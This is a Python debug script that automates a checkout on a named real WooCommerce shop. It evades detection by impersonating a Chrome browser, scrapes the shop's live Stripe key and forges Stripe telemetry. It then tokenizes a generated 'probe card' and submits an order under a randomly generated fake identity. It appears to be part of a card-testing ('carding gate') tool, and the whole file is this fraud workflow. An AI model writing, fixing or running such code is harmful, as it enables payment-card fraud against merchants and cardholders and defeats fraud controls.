# language: python, file: scratch/_debug_addr.py — полный текст invalid billing_address
import asyncio
import json
import sys

from curl_cffi.requests import AsyncSession

import gate_client as gc

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")


async def main():
    root = "https://magnesiumshop.nl"
    api = f"{root}/wp-json/wc/store/v1"
    async with AsyncSession(impersonate="chrome131", verify=False) as s:
        r_cart = await s.get(f"{api}/cart", timeout=10)
        nonce = r_cart.headers.get("nonce", "")
        r_prod = await s.get(f"{api}/products", params={"per_page": 30},
                             headers={"Nonce": nonce}, timeout=10)
        items = sorted((p for p in r_prod.json()
                        if p.get("prices", {}).get("price")
                        and int(p["prices"]["price"]) > 0),
                       key=lambda p: int(p["prices"]["price"]))
        prod = items[0]
        print("prod:", prod["name"][:40], prod["prices"]["price"])
        await s.post(f"{api}/cart/add-item",
                     params={"id": prod["id"], "quantity": "1"},
                     headers={"Nonce": nonce}, timeout=10)

        # страна магазина из draft
        r_draft = await s.get(f"{api}/checkout", headers={"Nonce": nonce}, timeout=10)
        shop_country = (r_draft.json().get("billing_address") or {}).get("country")
        print("shop country:", shop_country)

        pk = ""
        for path in ("/checkout/", "/", "/shop/"):
            r0 = await s.get(root + path, timeout=10)
            pk = gc.extract_pk_live(r0.text)
            if pk:
                break
        telem = gc.stripe_telemetry(root, pk)
        probe = gc.gen_probe_card()
        r_tok = await s.post("https://api.stripe.com/v1/payment_methods",
                             data=gc.tokenize_body(probe, telem, root),
                             headers=gc.TOKENIZE_HEADERS, timeout=8)
        pm_id = r_tok.json()["id"]

        ident = {**gc.random_identity(shop_country), **gc.geo_identity_fields(shop_country)}
        print("ident:", {k: ident.get(k) for k in ("line1", "city", "state", "postal_code")})
        body = {
            "billing_address": {
                "first_name": ident["first_name"], "last_name": ident["last_name"],
                "company": "", "address_1": ident.get("line1", ""),
                "address_2": "", "city": ident.get("city", ""),
                "state": ident.get("state", ""),
                "postcode": ident.get("postal_code", ""),
                "country": shop_country,
                "email": ident["email"],
                "phone": "+31 20 555 0101",
            },
            "shipping_address": {
                "first_name": ident["first_name"], "last_name": ident["last_name"],
                "company": "", "address_1": ident.get("line1", ""),
                "address_2": "", "city": ident.get("city", ""),
                "state": ident.get("state", ""),
                "postcode": ident.get("postal_code", ""),
                "country": shop_country,
            },
            "customer_note": "", "create_account": False, "terms": True,
            "payment_method": "stripe",
            "payment_data": [
                {"key": "wc-stripe-payment-method", "value": pm_id},
                {"key": "wc-stripe-payment-type", "value": "card"},
            ],
        }
        r_co = await s.post(f"{api}/checkout", json=body,
                            headers={"Nonce": nonce}, timeout=25)
        print("checkout:", r_co.status_code)
        print(json.dumps(r_co.json(), indent=1, ensure_ascii=False)[:2000])


if __name__ == "__main__":
    asyncio.run(main())
